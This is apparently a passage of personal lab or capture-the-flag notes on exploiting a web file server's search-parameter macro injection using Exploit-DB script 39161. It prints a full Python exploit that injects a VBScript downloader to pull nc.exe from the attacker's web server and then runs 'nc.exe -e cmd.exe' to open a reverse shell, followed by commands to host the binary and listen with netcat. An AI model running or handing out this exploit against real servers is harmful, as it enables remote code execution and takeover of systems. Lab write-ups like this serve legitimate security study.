- We will use the same CVE, but another [exploit](https://www.exploit-db.com/exploits/39161). Download it: `wget https://www.exploit-db.com/download/39161`. Then, modify the local IP address and port. There may be syntax errors in this Python script because of the version of Python, just fix them. Here is a modified version compatible with Python3. Sometimes, the default port `80` is used, we'd better use another port to start the Python http server, e.g., `8000`

    ```python
    import urllib.request as urllib2
    import sys

    try:
        def script_create():
            urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

        def execute_script():
            urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

        def nc_run():
            urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

        ip_addr = "10.10.190.246" #local IP address
        local_port = "5555" # Local Port number
        vbs = r"C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+":8000"+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
        save= "save|" + vbs
        vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
        exe= "exec|"+vbs2
        vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
        exe1= "exec|"+vbs3
        script_create()
        execute_script()
        nc_run()
    except:
        print("""[.]Something went wrong..!
        Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
        Don't forgot to change the Local IP address and Port number on the script""")
    ```
- Download the [netcat static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe): `wget https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe` (rename it to `nc.exe`, put it in the directory in which we will start the Python web server)
- Start a web server using Python: `python3 -m http.server`
- Listen to port `5555`: `nc -lvnp 5555`
- Run the exploit script twice: the first time will pull our netcat binary to the system and the second will execute our payload to gain a callback
- I ran the script for multiple times, it fetched `nc.exe` from my Python server, but I didn't get a reverse shell. I will try to find out the solution and fix it later.
